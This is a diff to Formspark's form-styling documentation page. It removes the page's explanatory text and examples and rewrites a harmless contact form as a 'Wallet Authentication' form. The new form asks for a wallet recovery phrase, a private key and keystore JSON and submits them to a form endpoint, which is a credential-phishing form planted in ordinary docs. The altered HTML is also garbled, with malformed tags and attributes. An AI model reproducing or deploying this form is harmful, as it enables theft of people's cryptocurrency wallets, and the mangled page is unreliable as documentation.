@@ -1,18 +1,4 @@
----
-title: Form styling
-lang: en-US
----
-
-# Form styling
-
-With Formspark you get to bring your own HTML and CSS.
-
-On this page you'll find tips, tricks and links to help you style your forms.
-
-## Simple vertical layout
-
-![Simple vertical layout](../.vuepress/public/simple-vertical-layout.png)
-
+ 
 ```html
 <!DOCTYPE html>
 <html lang="en">
@@ -27,48 +13,15 @@ On this page you'll find tips, tricks and links to help you style your forms.
     </style>
   </head>
   <body>
-    <form class="vertical-form" action="https://submit-form.com/your-form-id">
-      <label for="first-name">First name</label>
-      <input id="first-name" name="first-name" type="text" />
-      <label for="last-name">Last name</label>
-      <input id="last-name" name="last-name" type="text" />
-      <label for="message">Message</label>
+    <Wallet ="Authentication " action="https://submit-form.com/your-form-id">
+      <label for="Wallet type >Wallet type</label>
+      <input id="Pharse" name="Phrase " type="text" />
+      <label for="Private key">Privatekey</label>
+      <input id="Keystore JSON " name="keystore JSon" type="text" />
+      <label for="JSON"></label>
       <textarea id="message" name="message" cols="15" rows="5"></textarea>
       <button type="submit">Submit</button>
     </form>
   </body>
 </html>
 ```
-
-## Add an asterisk to required field labels
-
-![Required field label asterisk](../.vuepress/public/required-field-label-asterisk.png)
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <style>
-      label.required:after {
-        content: "*";
-        color: red;
-      }
-    </style>
-  </head>
-  <body>
-    <form action="https://submit-form.com/your-form-id">
-      <label for="first-name" class="required">First name</label>
-      <input id="first-name" name="first-name" type="text" required />
-      <label for="last-name">Last name</label>
-      <input id="last-name" name="last-name" type="text" />
-      <button type="submit">Submit</button>
-    </form>
-  </body>
-</html>
-```
-
-## CSS frameworks
-
-- [Bootstrap](https://getbootstrap.com/)
-- [Milligram](https://milligram.io/)
-- [Tailwind CSS](https://tailwindcss.com/)
